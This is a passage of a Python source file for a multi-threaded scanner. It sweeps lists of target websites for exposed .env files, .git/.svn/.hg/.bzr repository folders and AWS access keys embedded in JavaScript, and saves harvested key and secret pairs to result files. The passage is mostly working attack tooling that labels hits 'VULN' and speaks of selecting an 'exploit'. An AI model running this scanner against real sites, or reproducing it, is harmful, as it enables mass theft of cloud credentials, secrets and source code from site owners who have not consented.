                with open('Result/AWS/AWS_JS.txt', 'a', errors="ignore") as f:
                    f.write(f'{target} > {KEY}#{SECRET}')

                with open('Result/AWS/AWS_JS_AKIA.txt', 'a', errors="ignore") as f:
                    f.write(f'{KEY}#{SECRET}')

              
                return True

            console.print(f"[red][AWS_JS] {target} > BAD[/red]")
            return False

        except Exception as err:
            console.print(f"[yellow][AWS_JS] {target} > BAD[/yellow] > {err}")
            return False

    def AWS_JS_Grabber(url):
        try:
            GetLink = requests.get(site, timeout=30)  
        except Exception as err:
            console.print(f"[yellow][AWS_JS] {site} > TIMEOUT[/yellow]")
            return False 

        js_urls = re.findall(r'(?:href="|src=")([^\s]+\.js)', str(GetLink.content))
        js_urls = set(js_urls)
        if len(js_urls) == 0:
            return

        x = 0

        for js in js_urls:
            
            if js.startswith('.'):
                js = js.replace('./', '/')

            if js.startswith('/'):
                js = f"{site}{js}"

            if js.startswith('http'):
                pass
            else:
                js = f"{site}{js}"

            # js = js.replace('//', '/')

            try:
                playsound()
            except:
                pass

            console.print(f"[cyan][AWS_JS] {js} > [{x}/{len(js_urls)}][/cyan]")

            try:
                awsjs_checker(js)
            except Exception:
                console.print_exception(show_locals=False)
   
            x += 1


    if site == "":
        console.print(f"[yellow][Warning] > BAD TARGET FORMAT![/yellow]")
    
    if "://" in site:
        newurl = site.replace('https://', '').replace('http://', '').replace('/', '')
        site = 'http://' + newurl
    else:
        site = 'http://' + site

    try:
        with open('db.json') as included_imports:
            sxdb = json.load(included_imports)
            ENV = (sxdb['ENV'])
            GIT = (sxdb['GIT'])
            SVN = (sxdb['SVN'])
            HG = (sxdb['HG'])
            BZR = (sxdb['BZR'])
            AWS_JS = (sxdb['AWS_JS'])
    except Exception as err:
        return console.print_exception(show_locals=True)

    die = True

    if AWS_JS == 'on':
        die = False

        th = threading.Thread(target=AWS_JS_Grabber, args=(site,),)
        th.start()

    if ENV == 'on':
        die = False
        if env(site, '/.env') == False:
            console.print(f"[red][.env] {site}/.env > BAD[/red]")
            if env(site, '/core/.env') == False:
                console.print(f"[red][core/.env] {site}/core/.env > BAD[/red]") 
                if env(site, '/app/.env') == False:
                    console.print(f"[red][app/.env] {site}/app/.env > BAD[/red]")
                    if env(site, '/public/.env') == False:
                        console.print(f"[red][public/.env] {site}/public/.env > BAD[/red]")
                        if env(site, '/laravel/.env') == False:
                            console.print(f"[red][laravel/.env] {site}/laravel/.env > BAD[/red]")
                        else:
                            console.print(f"[green][laravel/.env] {site}/laravel/.env > VULN[/green]")
                    else:
                        console.print(f"[green][public/.env] {site}/public/.env > VULN[/green]")
                else:
                    console.print(f"[green][app/.env] {site}/app/.env > VULN[/green]")
            else:
               console.print(f"[green][core/.env] {site}/core/.env > VULN[/green]")
        else:
            console.print(f"[green][.env] {site} > VULN[/green]")

    if GIT == 'on':
        die = False
        checkGit(site, '/.git/config')
        
    if HG == 'on':
        die = False
        checkHG(site, '/.hg')
        
    if SVN == 'on':
        die = False
        checkSVN(site, '/.svn')

    if BZR == 'on':
        die = False
        checkBZR(site, '/.bzr')
    
    if die == True:
        exit('[WARNING] NO EXPLOIT SELECTED!')
  

def hunt():
    global inScopeTargets
    global gOneBot
    global GitHits
    global SvnHits
    global HgHits
    global EnvHits
    global BzrHits

    table = Table(title="MAIN MENU")

    table.add_column("Single Target", justify="center", style="green", no_wrap=True)
    table.add_column("Multiple Targets", justify="center", style="magenta")
    table.add_column("AWS Checker", justify="center", style="yellow")
    table.add_column("SETTINGS", justify="center", style="cyan")

    table.add_row("single, S, s, 1", "multi, M, m, 2", "aws, 3", "settings, SS, ss, 0")
    console = Console()
    console.print(table)

    # print(f"{RESET} [Single Target] {RED}>{LIGHTRED} single, S, s, 1")
    # print(f"{RESET} [Multiple Targets] {RED}>{LIGHTRED} multi, M, m, 2{RESET}")
    # print(f"{RESET} [AWS Checker] {RED}>{LIGHTRED} aws, 3{RESET}")
    # print(f"{RESET} [SETTINGS] {RED}>{LIGHTRED} settings, SS, ss, 0{RESET}")

    option = input(f"{CYAN}cmd {RED}> {RESET}")

    if option == 'settings' or option == 'SS' or option == 'ss' or option == '0':
        return settings_win()

    elif option == 'multi' or option == 'M' or option == 'm' or option == '2':
        current_directory = os.getcwd()
        folder_path = current_directory + '/InScope'
    
        for filename in os.listdir(folder_path):
            if os.path.isfile(os.path.join(folder_path, filename)):
                console.print(f"> {filename}")

        x77x = input(f"{CYAN}Targets {RED}>{RESET} ")

        if x77x.lower() == 'cls' or x77x.lower() == 'clear' or x77x.lower() == 'back':
            banner('yes')
            return hunt()

        file_name = 'InScope/' + x77x
        threads = input(f"{CYAN}Threads {RED}>{RESET} ")

        if threads.lower() == 'cls' or threads.lower() == 'clear' or threads.lower() == 'back':
            banner('yes')
            return hunt()


        with open(file_name, 'r', encoding="utf-8") as f:
            inScopeTargets = list(f)

        if len(inScopeTargets) == 0:
            print(f"[purple][[yellow]INFO[/yellow]][/purple] [purple]>[/purple] [yellow]No Targets[/yellow] [purple]>[/purple] [yellow]{file_name}[/yellow]")

        def trigger():
            global inScopeTargets
            global gOneBot
            global GitHits
            global SvnHits
            global HgHits
            global EnvHits
            global BzrHits

            init_time = time.time()

            try: 
                while True:

                    try:
                        if len(inScopeTargets) == 0:
                            break

                        try:
                            url = choice(inScopeTargets).replace('\n', '')
                        except Exception:
                            continue

                        if '.' not in url:
                            inScopeTargets.remove(f"{url}\n")
                            continue

                        # Scan Function
                        auto(url)
                        
                        try:
                           inScopeTargets.remove(f"{url}\n")
                        except:
                            try:
                                inScopeTargets.remove(f"{url}")
                            except:
                                pass

                    except Exception as err:
                        console.log(f"[bold red]Exception in auto()[/bold red] {err}\n")

            except (KeyboardInterrupt):
                console.print("\n\n[bold yellow][!] CTRL+C Detected![/bold yellow]")

            if gOneBot == True:
                gOneBot = False

                if len(inScopeTargets) != 0:   
                    with open(file_name, 'w', encoding="utf-8") as f:
                        f.write(f"")  

                    for line in inScopeTargets:
                        with open(file_name, 'a', encoding="utf-8") as f:
                            f.write(f"{line}\n")
                else:
                    with open(file_name, 'w', encoding="utf-8") as f:
                        f.write(f"")  

                console.print("\n[red]<------[DONE]------>[/red]")

                console.print(f"[cyan][ENV][/cyan] [purple]>[/purple] [green]{EnvHits}[/green]")
                console.print(f"[cyan][GIT][/cyan] [purple]>[/purple] [green]{GitHits}[/green]")
                console.print(f"[cyan][SVN][/cyan] [purple]>[/purple] [green]{SvnHits}[/green]")
                console.print(f"[cyan][HG][/cyan] [purple]>[/purple] [green]{HgHits}[/green]")
                console.print(f"[cyan][BZR][/cyan] [purple]>[/purple] [green]{BzrHits}[/green]")
    
                end_time = time.time()
                elapsed_time = end_time - init_time
                console.print(f"[purple]Elapsed Time[/purple] [red]=>[/red] [white]{elapsed_time:.2f} seconds[/white]\n")

        GitHits = 0
        SvnHits = 0
        HgHits = 0
        EnvHits = 0
        BzrHits = 0
        gOneBot = True
        
        console.print(f"\n<------------>")

        for x in range(int(threads)):
            try:
                tx = threading.Thread(target=trigger,)
                tx.start()
            except Exception as err:
                console.log(err)

    elif option == 'single' or option == 'S' or option == 's' or option == '1':
        
        url = input(f"{CYAN}Target{RED} => {RESET}")

        if url.lower() == 'cls' or url.lower() == 'clear' or url.lower() == 'back':
            banner('yes')
            return hunt()

        try:
            init_time = time.time()
            
            auto(url)

            # try:
            #     finder()
            # except Exception as err:
            #     print(f"[yellow]-> WARNING [finder] -> {err}[/yellow]")

            print("\n[red]<[/red][reset]------[bold green]DONE[/bold green]------[/reset][red]>[/red]")

            print(f"[cyan][ENV][/cyan] [purple]>[/purple] [green]{EnvHits}[/green]")
            print(f"[cyan][GIT][/cyan] [purple]>[/purple] [green]{GitHits}[/green]")
            print(f"[cyan][SVN][/cyan] [purple]>[/purple] [green]{SvnHits}[/green]")
            print(f"[cyan][HG][/cyan] [purple]>[/purple] [green]{HgHits}[/green]")
            print(f"[cyan][BZR][/cyan] [purple]>[/purple] [green]{BzrHits}[/green]")
            
            end_time = time.time()
            elapsed_time = end_time - init_time
            print(f"\n[purple]Elapsed Time[/purple] [red]=>[/red] [reset]{elapsed_time:.2f} seconds[/reset]\n")
        
        except (KeyboardInterrupt):
            sys.exit("\n\n[yellow][!] CTRL+C Detected![/yellow]\n")
                
    elif option == '3' or option == 'aws':
        AwsChecker()
        banner('yes')
        return hunt()

    elif option.lower() == 'cls' or option.lower() == 'clear' or option.lower() == 'back':
        banner('yes')
        return hunt()

if __name__ == "__main__":
    banner('yes')

    App = hunt()
